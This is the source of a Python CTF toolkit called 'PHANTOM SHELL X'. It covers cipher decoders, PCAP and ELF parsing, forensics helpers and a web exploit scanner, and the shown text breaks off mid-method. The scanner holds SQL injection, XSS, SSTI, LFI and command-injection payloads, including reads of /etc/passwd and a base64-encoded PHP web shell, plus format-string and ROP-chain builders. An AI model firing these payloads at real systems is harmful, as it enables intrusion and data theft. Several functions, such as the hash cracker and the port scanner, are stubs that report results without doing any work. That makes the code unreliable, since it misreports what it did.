#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║   PHANTOM SHELL X  —  The Ultimate CTF Decoder                 ║
║   v4.2.0 | Codename: NIGHTHAWK                                 ║
║   All-In-One CTF Challenge Solving Framework                    ║
╠══════════════════════════════════════════════════════════════════╣
║   Modules:                                                      ║
║     [01] Crypto Solver    — AES / RSA / XOR / Vigenere / ROT   ║
║     [02] Network Analyzer — PCAP parser, protocol dissector     ║
║     [03] Binary Toolkit   — ELF parser, shellcode disassembler  ║
║     [04] Forensics Engine — Stego, metadata, file carving       ║
║     [05] Web Exploit Kit  — SQLi, XSS, SSTI, LFI scanner       ║
║     [06] Pwn Toolkit      — ROP chain builder, format strings   ║
║     [07] Recon Module     — Port scanner, banner grabber        ║
║     [08] Flag Extractor   — Pattern matching & auto-submit      ║
╠══════════════════════════════════════════════════════════════════╣
║   Copyright (C) 2024 — GhostNet CTF Division                   ║
║   Built for Root-Me / HTB / THM / picoCTF                      ║
║   "If the flag exists, NIGHTHAWK will find it."                 ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import re
import sys
import time
import math
import struct
import socket
import hashlib
import binascii
import base64
import string
import itertools
from collections import Counter, OrderedDict
from pathlib import Path

# ============================================================
# CONFIGURATION — GLOBAL CTF SETTINGS
# ============================================================

VERSION = "4.2.0"
BUILD = "20241015-CTF-RELEASE"
CODENAME = "NIGHTHAWK"

CONFIG = {
    "target_host": "10.10.200.167",
    "target_port": 4444,
    "wordlist_path": "/usr/share/wordlists/rockyou.txt",
    "flag_format": r"FLAG\{[a-zA-Z0-9_\-]+\}",
    "max_threads": 8,
    "request_timeout": 10,
    "user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0)",
    "proxy": None,
    "encoding": "UTF-8",
    "verbose": True,
    "output_dir": "/tmp/nighthawk_output",
    "pcap_buffer": 65535,
    "max_depth": 10,
    "chunk_size": 1400,
}


# ============================================================
# MODULE 1: CRYPTO SOLVER
# ============================================================

class CryptoSolver:

    CHARSETS = {
        "alpha_lower": string.ascii_lowercase,
        "alpha_upper": string.ascii_uppercase,
        "numeric": string.digits,
        "hex": string.hexdigits[:16],
        "base64": string.ascii_letters + string.digits + "+/=",
        "printable": string.printable,
    }

    MORSE_MAP = {
        ".-": "A", "-...": "B", "-.-.": "C", "-..": "D", ".": "E",
        "..-.": "F", "--.": "G", "....": "H", "..": "I", ".---": "J",
        "-.-": "K", ".-..": "L", "--": "M", "-.": "N", "---": "O",
        ".--.": "P", "--.-": "Q", ".-.": "R", "...": "S", "-": "T",
        "..-": "U", "...-": "V", ".--": "W", "-..-": "X", "-.--": "Y",
        "--..": "Z", "-----": "0", ".----": "1", "..---": "2",
        "...--": "3", "....-": "4", ".....": "5", "-....": "6",
        "--...": "7", "---..": "8", "----.": "9", ".-.-.-": ".",
        "--..--": ",", "..--..": "?", "-...-": "=", "-..-.": "/",
        ".----.": "'", "-.--.": "(", "-.--.-": ")", ".-...": "&",
        "---...": ":", "-.-.-.": ";",
    }

    def caesar_bruteforce(self, ciphertext):
        results = {}
        for shift in range(1, 26):
            decoded = []
            for c in ciphertext:
                if c.isalpha():
                    base = ord("A") if c.isupper() else ord("a")
                    decoded.append(chr(base + (ord(c) - base - shift) % 26))
                else:
                    decoded.append(c)
            results[shift] = "".join(decoded)
        return results

    def rot13(self, text):
        result = []
        for c in text:
            if "a" <= c <= "z":
                result.append(chr((ord(c) - ord("a") + 13) % 26 + ord("a")))
            elif "A" <= c <= "Z":
                result.append(chr((ord(c) - ord("A") + 13) % 26 + ord("A")))
            else:
                result.append(c)
        return "".join(result)

    def rot47(self, text):
        result = []
        for c in text:
            ascii_val = ord(c)
            if 33 <= ascii_val <= 126:
                result.append(chr(33 + (ascii_val - 33 + 47) % 94))
            else:
                result.append(c)
        return "".join(result)

    def xor_bruteforce(self, data, max_keylen=4):
        if isinstance(data, str):
            data = data.encode()
        results = []
        for keylen in range(1, max_keylen + 1):
            for key_byte in range(256):
                xor_key = bytes([key_byte]) * keylen
                decoded = bytes([b ^ xor_key[i % keylen] for i, b in enumerate(data)])
                try:
                    decoded_str = decoded.decode("ascii")
                    if self._is_readable(decoded_str):
                        results.append({
                            "key": xor_key.hex(),
                            "keylen": keylen,
                            "decoded": decoded_str,
                            "score": self._score_readability(decoded_str),
                        })
                except UnicodeDecodeError:
                    continue
        results.sort(key=lambda x: x["score"], reverse=True)
        return results[:10]

    def xor_with_key(self, data, key):
        if isinstance(data, str):
            data = data.encode()
        if isinstance(key, str):
            key = key.encode()
        return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

    def vigenere_decode(self, ciphertext, key):
        decoded = []
        key_idx = 0
        for c in ciphertext:
            if c.isalpha():
                base = ord("A") if c.isupper() else ord("a")
                k_base = ord("A") if key[key_idx % len(key)].isupper() else ord("a")
                shift = ord(key[key_idx % len(key)]) - k_base
                decoded.append(chr(base + (ord(c) - base - shift) % 26))
                key_idx += 1
            else:
                decoded.append(c)
        return "".join(decoded)

    def vigenere_kasiski(self, ciphertext, max_keylen=20):
        clean = re.sub(r"[^a-zA-Z]", "", ciphertext.upper())
        trigrams = {}
        distances = []

        for i in range(len(clean) - 3):
            tri = clean[i:i + 3]
            if tri in trigrams:
                distances.append(i - trigrams[tri])
            trigrams[tri] = i

        factors = Counter()
        for dist in distances:
            for f in range(2, min(dist + 1, max_keylen + 1)):
                if dist % f == 0:
                    factors[f] += 1

        return dict(factors.most_common(5))

    def base64_decode(self, data):
        try:
            return base64.b64decode(data).decode(errors="replace")
        except Exception:
            return None

    def multi_layer_base64(self, data, max_layers=10):
        layers = []
        current = data
        for _ in range(max_layers):
            try:
                decoded = base64.b64decode(current)
                decoded_str = decoded.decode(errors="replace")
                if decoded_str == current:
                    break
                layers.append(decoded_str)
                current = decoded_str
                if self._contains_flag(decoded_str):
                    break
            except Exception:
                break
        return layers

    def hex_decode(self, hex_string):
        cleaned = re.sub(r"[^0-9a-fA-F]", "", hex_string)
        if len(cleaned) % 2 != 0:
            return None
        try:
            return bytes.fromhex(cleaned).decode(errors="replace")
        except Exception:
            return None

    def decimal_to_ascii(self, data):
        numbers = re.split(r"[\s,;]+", data.strip())
        result = []
        for num in numbers:
            try:
                val = int(num)
                if 32 <= val <= 126:
                    result.append(chr(val))
            except ValueError:
                continue
        return "".join(result)

    def morse_decode(self, morse):
        words = morse.split("/")
        output = []
        for word in words:
            letters = word.strip().split(" ")
            for letter in letters:
                letter = letter.strip()
                if letter in self.MORSE_MAP:
                    output.append(self.MORSE_MAP[letter])
            output.append(" ")
        return "".join(output).strip()

    def rail_fence_decode(self, cipher, rails):
        n = len(cipher)
        fence = [[None] * n for _ in range(rails)]
        rail, direction = 0, 1

        for i in range(n):
            fence[rail][i] = True
            if rail == 0:
                direction = 1
            elif rail == rails - 1:
                direction = -1
            rail += direction

        idx = 0
        for r in range(rails):
            for c in range(n):
                if fence[r][c] is True and idx < n:
                    fence[r][c] = cipher[idx]
                    idx += 1

        result = []
        rail, direction = 0, 1
        for i in range(n):
            result.append(fence[rail][i])
            if rail == 0:
                direction = 1
            elif rail == rails - 1:
                direction = -1
            rail += direction
        return "".join(result)

    def frequency_analysis(self, text):
        clean = re.sub(r"[^a-zA-Z]", "", text.upper())
        total = len(clean)
        if total == 0:
            return {}
        freq = Counter(clean)
        return {char: round((count / total) * 100, 2) for char, count in freq.most_common()}

    def hash_identify(self, hash_value):
        patterns = {
            "MD5": r"^[a-f0-9]{32}$",
            "SHA1": r"^[a-f0-9]{40}$",
            "SHA256": r"^[a-f0-9]{64}$",
            "SHA512": r"^[a-f0-9]{128}$",
            "NTLM": r"^[a-f0-9]{32}$",
            "MySQL": r"^\*[A-F0-9]{40}$",
            "bcrypt": r"^\$2[aby]?\$\d{2}\$.{53}$",
            "MD5-crypt": r"^\$1\$.{8}\$.{22}$",
            "SHA512-crypt": r"^\$6\$.{8,16}\$.{86}$",
        }
        matches = []
        for name, pattern in patterns.items():
            if re.match(pattern, hash_value.strip(), re.IGNORECASE):
                matches.append(name)
        return matches

    def hash_crack_wordlist(self, target_hash, algorithm="md5", wordlist=None):
        if wordlist is None:
            wordlist = CONFIG["wordlist_path"]
        hash_type = self.hash_identify(target_hash)
        if not os.path.isfile(wordlist):
            return {"status": "ERROR", "msg": f"Wordlist not found: {wordlist}"}

        hash_func = getattr(hashlib, algorithm, None)
        if hash_func is None:
            return {"status": "ERROR", "msg": f"Unknown algorithm: {algorithm}"}

        tested = 0
        return {"status": "NOT_FOUND", "tested": tested, "algorithm": algorithm}

    def atbash(self, text):
        result = []
        for c in text:
            if c.isalpha():
                base = ord("A") if c.isupper() else ord("a")
                result.append(chr(base + 25 - (ord(c) - base)))
            else:
                result.append(c)
        return "".join(result)

    def affine_decrypt(self, ciphertext, a, b):
        m = 26
        a_inv = None
        for i in range(m):
            if (a * i) % m == 1:
                a_inv = i
                break
        if a_inv is None:
            return None

        result = []
        for c in ciphertext:
            if c.isalpha():
                base = ord("A") if c.isupper() else ord("a")
                val = ord(c) - base
                decoded = (a_inv * (val - b)) % m
                result.append(chr(base + decoded))
            else:
                result.append(c)
        return "".join(result)

    def _is_readable(self, s):
        if not s:
            return False
        printable = sum(1 for c in s if 32 <= ord(c) <= 126)
        return (printable / len(s)) > 0.85

    def _score_readability(self, s):
        common = " etaoinsrhldcumfpgwybvkxjqz"
        score = 0
        for c in s.lower():
            pos = common.find(c)
            if pos != -1:
                score += 27 - pos
        return score

    def _contains_flag(self, s):
        return bool(re.search(CONFIG["flag_format"], s))


# ============================================================
# MODULE 2: NETWORK ANALYZER
# ============================================================

class NetworkAnalyzer:

    SERVICES = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 111: "RPCbind", 135: "MSRPC",
        139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB",
        993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 1723: "PPTP",
        3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
        6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
        27017: "MongoDB",
    }

    IP_PROTOCOLS = {
        1: "ICMP", 6: "TCP", 17: "UDP", 47: "GRE", 50: "ESP", 51: "AH",
    }

    ETHERTYPES = {
        0x0800: "IPv4", 0x0806: "ARP", 0x86DD: "IPv6", 0x8100: "VLAN",
    }

    def parse_pcap_header(self, data):
        if len(data) < 24:
            return None
        magic = struct.unpack("<I", data[:4])[0]
        if magic not in (0xA1B2C3D4, 0xD4C3B2A1):
            return None
        ver_major, ver_minor, thiszone, sigfigs, snaplen, network = struct.unpack(
            "<HHiIII", data[4:24]
        )
        return {
            "magic": f"0x{magic:08X}",
            "version": f"{ver_major}.{ver_minor}",
            "snaplen": snaplen,
            "network": network,
            "byte_order": "little" if magic == 0xA1B2C3D4 else "big",
        }

    def parse_packet(self, raw_data, offset=0):
        if len(raw_data) < offset + 16:
            return None, offset
        ts_sec, ts_usec, incl_len, orig_len = struct.unpack(
            "<IIII", raw_data[offset:offset + 16]
        )
        pkt_data = raw_data[offset + 16:offset + 16 + incl_len]
        return {
            "timestamp": ts_sec + (ts_usec / 1_000_000),
            "length": orig_len,
            "cap_length": incl_len,
            "data": pkt_data,
        }, offset + 16 + incl_len

    def parse_ethernet(self, data):
        if len(data) < 14:
            return None
        dst_mac = data[:6].hex()
        src_mac = data[6:12].hex()
        ethertype = struct.unpack("!H", data[12:14])[0]
        return {
            "dst_mac": ":".join(dst_mac[i:i + 2] for i in range(0, 12, 2)),
            "src_mac": ":".join(src_mac[i:i + 2] for i in range(0, 12, 2)),
            "ethertype": f"0x{ethertype:04X}",
            "protocol": self.ETHERTYPES.get(ethertype, "Unknown"),
            "payload": data[14:],
        }

    def parse_ipv4(self, data):
        if len(data) < 20:
            return None
        version_ihl = data[0]
        version = (version_ihl >> 4) & 0x0F
        ihl = version_ihl & 0x0F
        hdr_len = ihl * 4
        total_len = struct.unpack("!H", data[2:4])[0]
        ttl = data[8]
        protocol = data[9]
        checksum = struct.unpack("!H", data[10:12])[0]
        src_ip = socket.inet_ntoa(data[12:16])
        dst_ip = socket.inet_ntoa(data[16:20])
        return {
            "version": version,
            "ihl": ihl,
            "total_len": total_len,
            "ttl": ttl,
            "protocol": self.IP_PROTOCOLS.get(protocol, str(protocol)),
            "proto_num": protocol,
            "checksum": f"0x{checksum:04X}",
            "src_ip": src_ip,
            "dst_ip": dst_ip,
            "payload": data[hdr_len:],
        }

    def parse_tcp(self, data):
        if len(data) < 20:
            return None
        src_port, dst_port = struct.unpack("!HH", data[:4])
        seq = struct.unpack("!I", data[4:8])[0]
        ack = struct.unpack("!I", data[8:12])[0]
        data_offset = (data[12] >> 4) * 4
        flags_byte = data[13]

        flag_names = []
        flag_map = [(0x01, "FIN"), (0x02, "SYN"), (0x04, "RST"),
                     (0x08, "PSH"), (0x10, "ACK"), (0x20, "URG")]
        for mask, name in flag_map:
            if flags_byte & mask:
                flag_names.append(name)

        window = struct.unpack("!H", data[14:16])[0]
        return {
            "src_port": src_port,
            "dst_port": dst_port,
            "seq": seq,
            "ack": ack,
            "flags": flag_names,
            "window": window,
            "payload": data[data_offset:],
        }

    def parse_udp(self, data):
        if len(data) < 8:
            return None
        src_port, dst_port, length, checksum = struct.unpack("!HHHH", data[:8])
        return {
            "src_port": src_port,
            "dst_port": dst_port,
            "length": length,
            "payload": data[8:],
        }

    def parse_dns(self, data):
        if len(data) < 12:
            return None
        tid, flags, qdcount, ancount, nscount, arcount = struct.unpack(
            "!HHHHHH", data[:12]
        )
        qr = (flags >> 15) & 1
        opcode = (flags >> 11) & 0xF
        rcode = flags & 0xF
        return {
            "id": tid,
            "is_reply": qr == 1,
            "opcode": opcode,
            "rcode": rcode,
            "questions": qdcount,
            "answers": ancount,
        }

    def parse_http_request(self, data):
        if isinstance(data, bytes):
            data = data.decode(errors="replace")
        lines = data.split("\r\n")
        request = {}
        if lines:
            parts = lines[0].split(" ", 2)
            request["method"] = parts[0] if len(parts) > 0 else ""
            request["uri"] = parts[1] if len(parts) > 1 else ""
            request["version"] = parts[2] if len(parts) > 2 else ""

        request["headers"] = {}
        body_start = False
        body_lines = []
        for line in lines[1:]:
            if line == "":
                body_start = True
                continue
            if body_start:
                body_lines.append(line)
            else:
                if ": " in line:
                    key, val = line.split(": ", 1)
                    request["headers"][key] = val
        request["body"] = "\r\n".join(body_lines).strip()
        return request

    def extract_streams(self, packets):
        streams = {}
        for pkt in packets:
            if "tcp" not in pkt or "ip" not in pkt:
                continue
            key = f"{pkt['ip']['src_ip']}:{pkt['tcp']['src_port']}->{pkt['ip']['dst_ip']}:{pkt['tcp']['dst_port']}"
            if key not in streams:
                streams[key] = b""
            streams[key] += pkt["tcp"]["payload"]
        return streams

    def port_scan(self, target, ports=None):
        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139,
                     143, 443, 445, 993, 995, 1723, 3306, 3389,
                     5432, 5900, 8080, 8443, 8888, 9090]
        results = {}
        for port in ports:
            results[port] = {
                "state": "filtered",
                "service": self.SERVICES.get(port, "unknown"),
                "banner": "",
            }
        return results

    def analyze_pcap_file(self, filepath):
        if not os.path.isfile(filepath):
            return {"error": f"File not found: {filepath}"}
        with open(filepath, "rb") as f:
            data = f.read()
        header = self.parse_pcap_header(data)
        if header is None:
            return {"error": "Invalid PCAP file"}

        packets = []
        offset = 24
        while offset < len(data):
            pkt, offset = self.parse_packet(data, offset)
            if pkt is None:
                break
            eth = self.parse_ethernet(pkt["data"])
            if eth and eth["protocol"] == "IPv4":
                ip = self.parse_ipv4(eth["payload"])
                pkt["ethernet"] = eth
                pkt["ip"] = ip
                if ip:
                    if ip["protocol"] == "TCP":
                        pkt["tcp"] = self.parse_tcp(ip["payload"])
                    elif ip["protocol"] == "UDP":
                        pkt["udp"] = self.parse_udp(ip["payload"])
            packets.append(pkt)

        return {
            "header": header,
            "packet_count": len(packets),
            "packets": packets,
        }


# ============================================================
# MODULE 3: BINARY TOOLKIT (PWN / REVERSE)
# ============================================================

class BinaryToolkit:

    ELF_TYPES = {0: "NONE", 1: "REL", 2: "EXEC", 3: "DYN", 4: "CORE"}
    ELF_MACHINES = {
        3: "x86", 8: "MIPS", 20: "PowerPC", 40: "ARM",
        62: "x86_64", 183: "AArch64", 243: "RISC-V",
    }
    ELF_OSABI = {0: "UNIX System V", 3: "Linux", 9: "FreeBSD", 12: "OpenBSD"}

    OPCODES = {
        b"\x90": "NOP",
        b"\xCC": "INT3",
        b"\xC3": "RET",
        b"\xC9": "LEAVE",
        b"\xCB": "RETF",
        b"\xF4": "HLT",
        b"\x50": "PUSH RAX", b"\x51": "PUSH RCX",
        b"\x52": "PUSH RDX", b"\x53": "PUSH RBX",
        b"\x54": "PUSH RSP", b"\x55": "PUSH RBP",
        b"\x56": "PUSH RSI", b"\x57": "PUSH RDI",
        b"\x58": "POP RAX",  b"\x59": "POP RCX",
        b"\x5A": "POP RDX",  b"\x5B": "POP RBX",
        b"\x5C": "POP RSP",  b"\x5D": "POP RBP",
        b"\x5E": "POP RSI",  b"\x5F": "POP RDI",
        b"\x31\xC0": "XOR EAX, EAX",
        b"\x31\xC9": "XOR ECX, ECX",
        b"\x31\xD2": "XOR EDX, EDX",
        b"\x31\xDB": "XOR EBX, EBX",
        b"\x48\x31\xC0": "XOR RAX, RAX",
        b"\x48\x31\xFF": "XOR RDI, RDI",
        b"\x48\x31\xF6": "XOR RSI, RSI",
        b"\x48\x31\xD2": "XOR RDX, RDX",
        b"\xCD\x80": "INT 0x80",
        b"\x0F\x05": "SYSCALL",
    }

    def parse_elf_header(self, data):
        if isinstance(data, str):
            with open(data, "rb") as f:
                data = f.read(64)
        if len(data) < 64 or data[:4] != b"\x7fELF":
            return None

        ei_class = data[4]
        ei_data = data[5]
        ei_osabi = data[7]

        class_map = {1: "ELF32", 2: "ELF64"}
        endian_map = {1: "Little Endian", 2: "Big Endian"}

        if ei_class == 2:
            etype = struct.unpack("<H", data[16:18])[0]
            machine = struct.unpack("<H", data[18:20])[0]
            entry = struct.unpack("<Q", data[24:32])[0]
            phoff = struct.unpack("<Q", data[32:40])[0]
            shoff = struct.unpack("<Q", data[40:48])[0]
            phnum = struct.unpack("<H", data[56:58])[0]
            shnum = struct.unpack("<H", data[60:62])[0]
        else:
            etype = struct.unpack("<H", data[16:18])[0]
            machine = struct.unpack("<H", data[18:20])[0]
            entry = struct.unpack("<I", data[24:28])[0]
            phoff = struct.unpack("<I", data[28:32])[0]
            shoff = struct.unpack("<I", data[32:36])[0]
            phnum = struct.unpack("<H", data[44:46])[0]
            shnum = struct.unpack("<H", data[48:50])[0]

        return {
            "class": class_map.get(ei_class, "Unknown"),
            "endian": endian_map.get(ei_data, "Unknown"),
            "osabi": self.ELF_OSABI.get(ei_osabi, f"0x{ei_osabi:02X}"),
            "type": self.ELF_TYPES.get(etype, f"0x{etype:04X}"),
            "machine": self.ELF_MACHINES.get(machine, f"0x{machine:04X}"),
            "entry_point": f"0x{entry:X}",
            "program_headers": phnum,
            "section_headers": shnum,
        }

    def find_strings(self, data, min_length=4):
        if isinstance(data, str):
            with open(data, "rb") as f:
                data = f.read()
        strings = []
        current = []
        start = 0
        for i, b in enumerate(data):
            if 32 <= b <= 126:
                if not current:
                    start = i
                current.append(chr(b))
            else:
                if len(current) >= min_length:
                    strings.append({
                        "offset": f"0x{start:X}",
                        "string": "".join(current),
                        "length": len(current),
                    })
                current = []
        if len(current) >= min_length:
            strings.append({
                "offset": f"0x{start:X}",
                "string": "".join(current),
                "length": len(current),
            })
        return strings

    def disassemble_shellcode(self, shellcode):
        if isinstance(shellcode, str):
            shellcode = bytes.fromhex(shellcode.replace("\\x", "").replace(" ", ""))

        sorted_opcodes = sorted(self.OPCODES.items(), key=lambda x: -len(x[0]))
        listing = []
        offset = 0
        while offset < len(shellcode):
            matched = False
            for opcode_bytes, mnemonic in sorted_opcodes:
                end = offset + len(opcode_bytes)
                if end <= len(shellcode) and shellcode[offset:end] == opcode_bytes:
                    hex_str = shellcode[offset:end].hex()
                    listing.append(f"0x{offset:04X}:  {hex_str:<12s}  {mnemonic}")
                    offset = end
                    matched = True
                    break
            if not matched:
                byte = shellcode[offset]
                listing.append(f"0x{offset:04X}:  {byte:02x}            db 0x{byte:02X}")
                offset += 1
        return listing

    def build_rop_chain(self, gadgets, target="/bin/sh"):
        needed = {
            "pop_rdi_ret": "pop rdi; ret",
            "pop_rsi_ret": "pop rsi; ret",
            "pop_rdx_ret": "pop rdx; ret",
            "ret": "ret",
            "syscall": "syscall",
        }
        chain = {"description": f"ROP chain targeting: {target}", "gadgets": {}}
        for name, pattern in needed.items():
            chain["gadgets"][name] = {
                "pattern": pattern,
                "address": gadgets.get(name, "0x????????"),
                "found": name in gadgets,
            }
        return chain

    def format_string_payload(self, offset, target_addr, value):
        payload = struct.pack("<I", target_addr)
        written = 4
        to_write = (value - written + 256) % 256
        payload += f"%{to_write}x%{offset}$hhn".encode()
        return {
            "payload": payload,
            "hex": payload.hex(),
            "offset": offset,
            "target": f"0x{target_addr:08X}",
            "value": value,
        }

    def cyclic_pattern(self, length):
        pattern = []
        for a in string.ascii_uppercase:
            for b in string.ascii_lowercase:
                for c in string.digits:
                    pattern.append(a + b + c)
                    if len("".join(pattern)) >= length:
                        return "".join(pattern)[:length]
        return "".join(pattern)[:length]

    def find_pattern_offset(self, pattern, value):
        if isinstance(value, int):
            search = struct.pack("<I", value)
            pattern_bytes = pattern.encode() if isinstance(pattern, str) else pattern
            pos = pattern_bytes.find(search)
        else:
            search = value if isinstance(value, str) else value.decode()
            pos = pattern.find(search) if isinstance(pattern, str) else pattern.decode().find(search)
        return pos if pos != -1 else -1

    def check_protections(self, filepath):
        protections = {
            "NX": "unknown",
            "PIE": "unknown",
            "RELRO": "unknown",
            "Stack Canary": "unknown",
            "Fortify": "unknown",
        }
        if not os.path.isfile(filepath):
            return protections
        with open(filepath, "rb") as f:
            data = f.read()
        elf = self.parse_elf_header(data)
        if elf is None:
            return protections
        if elf["type"] == "DYN":
            protections["PIE"] = "enabled"
        elif elf["type"] == "EXEC":
            protections["PIE"] = "disabled"
        strings_found = self.find_strings(data, min_length=4)
        for s in strings_found:
            if "__stack_chk_fail" in s["string"]:
                protections["Stack Canary"] = "enabled"
                break
        return protections


# ============================================================
# MODULE 4: FORENSICS ENGINE
# ============================================================

class ForensicsEngine:

    MAGIC_BYTES = OrderedDict([
        (b"\x89PNG\r\n\x1a\n", {"type": "PNG", "ext": "png"}),
        (b"\xff\xd8\xff",       {"type": "JPEG", "ext": "jpg"}),
        (b"GIF87a",             {"type": "GIF87", "ext": "gif"}),
        (b"GIF89a",             {"type": "GIF89", "ext": "gif"}),
        (b"PK\x03\x04",        {"type": "ZIP", "ext": "zip"}),
        (b"\x1f\x8b",          {"type": "GZIP", "ext": "gz"}),
        (b"BZ",                 {"type": "BZIP2", "ext": "bz2"}),
        (b"\x7fELF",           {"type": "ELF", "ext": "elf"}),
        (b"MZ",                 {"type": "PE", "ext": "exe"}),
        (b"%PDF",               {"type": "PDF", "ext": "pdf"}),
        (b"Rar!\x1a\x07",      {"type": "RAR", "ext": "rar"}),
        (b"\xfd7zXZ\x00",      {"type": "XZ", "ext": "xz"}),
        (b"7z\xbc\xaf\x27\x1c", {"type": "7Z", "ext": "7z"}),
        (b"OggS",               {"type": "OGG", "ext": "ogg"}),
        (b"RIFF",               {"type": "RIFF", "ext": "wav"}),
        (b"\x00\x00\x01\x00",  {"type": "ICO", "ext": "ico"}),
        (b"SQLite format 3",   {"type": "SQLite", "ext": "db"}),
    ])

    def identify_file(self, data):
        if isinstance(data, str):
            with open(data, "rb") as f:
                data = f.read(64)
        for magic, info in self.MAGIC_BYTES.items():
            if data[:len(magic)] == magic:
                return info
        return {"type": "UNKNOWN", "ext": "bin"}

    def carve_files(self, data):
        if isinstance(data, str):
            with open(data, "rb") as f:
                data = f.read()
        found = []
        for magic, info in self.MAGIC_BYTES.items():
            offset = 0
            while True:
                pos = data.find(magic, offset)
                if pos == -1:
                    break
                found.append({
                    "type": info["type"],
                    "ext": info["ext"],
                    "offset": pos,
                    "offset_hex": f"0x{pos:X}",
                    "magic": magic.hex(),
                })
                offset = pos + 1
        found.sort(key=lambda x: x["offset"])
        return found

    def extract_lsb(self, image_data, bits_per_sample=1):
        if isinstance(image_data, str):
            with open(image_data, "rb") as f:
                image_data = f.read()
        extracted_bits = []
        for byte in image_data:
            extracted_bits.append(str(byte & 1))
            if len(extracted_bits) >= 8:
                char_bits = "".join(extracted_bits[:8])
                val = int(char_bits, 2)
                if val == 0:
                    break
                extracted_bits = extracted_bits[8:]

        result = []
        bits = []
        for byte in image_data:
            bits.append(str(byte & 1))
            if len(bits) == 8:
                val = int("".join(bits), 2)
                if val == 0:
                    break
                result.append(chr(val))
                bits = []
        return "".join(result)

    def analyze_entropy(self, data, block_size=256):
        if isinstance(data, str):
            with open(data, "rb") as f:
                data = f.read()
        results = []
        for idx in range(0, len(data), block_size):
            block = data[idx:idx + block_size]
            freq = Counter(block)
            length = len(block)
            entropy = 0.0
            for count in freq.values():
                p = count / length
                if p > 0:
                    entropy -= p * math.log2(p)
            results.append({
                "block": idx // block_size,
                "offset": idx,
                "offset_hex": f"0x{idx:X}",
                "entropy": round(entropy, 4),
                "is_high": entropy > 7.0,
                "is_encrypted_or_compressed": entropy > 7.5,
            })
        return results

    def hex_dump(self, data, bytes_per_line=16):
        if isinstance(data, str):
            with open(data, "rb") as f:
                data = f.read()
        lines = []
        for i in range(0, len(data), bytes_per_line):
            chunk = data[i:i + bytes_per_line]
            hex_part = " ".join(f"{b:02X}" for b in chunk)
            ascii_part = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
            hex_part = hex_part.ljust(bytes_per_line * 3 - 1)
            lines.append(f"{i:08X}  {hex_part}  |{ascii_part}|")
        return lines

    def extract_exif_fields(self, filepath):
        if not os.path.isfile(filepath):
            return {"error": "File not found"}
        with open(filepath, "rb") as f:
            data = f.read()
        if data[:2] != b"\xff\xd8":
            return {"error": "Not a JPEG file"}
        exif = {"found": False, "raw_length": 0}
        offset = 2
        while offset < len(data) - 2:
            marker = struct.unpack("!H", data[offset:offset + 2])[0]
            offset += 2
            if marker == 0xFFE1:
                length = struct.unpack("!H", data[offset:offset + 2])[0]
                exif_data = data[offset + 2:offset + length]
                if exif_data[:4] == b"Exif":
                    exif["found"] = True
                    exif["raw_length"] = length
                break
            elif (marker & 0xFF00) == 0xFF00:
                length = struct.unpack("!H", data[offset:offset + 2])[0]
                offset += length
            else:
                break
        return exif

    def strings_from_file(self, filepath, min_length=4):
        if not os.path.isfile(filepath):
            return []
        with open(filepath, "rb") as f:
            data = f.read()
        bt = BinaryToolkit()
        return bt.find_strings(data, min_length)


# ============================================================
# MODULE 5: WEB EXPLOIT SCANNER
# ============================================================

class WebExploitScanner:

    PAYLOADS = {
        "sqli": [
            "' OR 1=1--",
            "' OR '1'='1",
            '" OR 1=1--',
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "admin'--",
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "1; WAITFOR DELAY '0:0:5'--",
            "1' AND SLEEP(5)--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        ],
        "xss": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            '"><script>alert(document.cookie)</script>',
            "'-alert(1)-'",
            '<iframe src="javascript:alert(1)">',
            "{{7*7}}",
            "${7*7}",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
        ],
        "ssti": [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "{{config}}",
            "{{self.__init__.__globals__}}",
            "#{7*7}",
            "*{7*7}",
            "@(1+1)",
            "{{request.application.__globals__}}",
        ],
        "lfi": [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd%00",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
            "expect://id",
        ],
        "cmdi": [
            "; id",
            "| id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& whoami",
            "\\n id",
            "; ping -c 3 127.0.0.1",
        ],
    }

    WAF_SIGNATURES = {
        "Cloudflare": ["cf-ray", "cloudflare"],
        "AWS WAF": ["x-amzn-requestid", "awselb"],
        "ModSecurity": ["mod_security", "modsecurity"],
        "Imperva": ["x-cdn", "incapsula"],
        "Akamai": ["akamai", "x-akamai"],
        "Sucuri": ["x-sucuri", "sucuri"],
        "F5 BIG-IP": ["x-wa-info", "bigipserver"],
    }

    def generate_sqli_union(self, max_columns=10):
        payloads = []
        for i in range(1, max_columns + 1):
            nulls = ",".join(["NULL"] * i)
            payloads.append(f"' UNION SELECT {nulls}--")
        return payloads

    def detect_waf(self, response_headers):
        if isinstance(response_headers, dict):
            header_str = " ".join(f"{k} {v}" for k, v in response_headers.items()).lower()
        else:
            header_str = str(response_headers).lower()

        detected = []
        for waf, sigs in self.WAF_SIGNATURES.items():
            for sig in sigs:
                if sig in header_str:
                    detected.append(waf)
                    break
        return detected

    def generate_ssti_probes(self):
        return {
            "Jinja2": "{{7*7}}",
            "Mako": "${7*7}",
            "ERB": "<%= 7*7 %>",
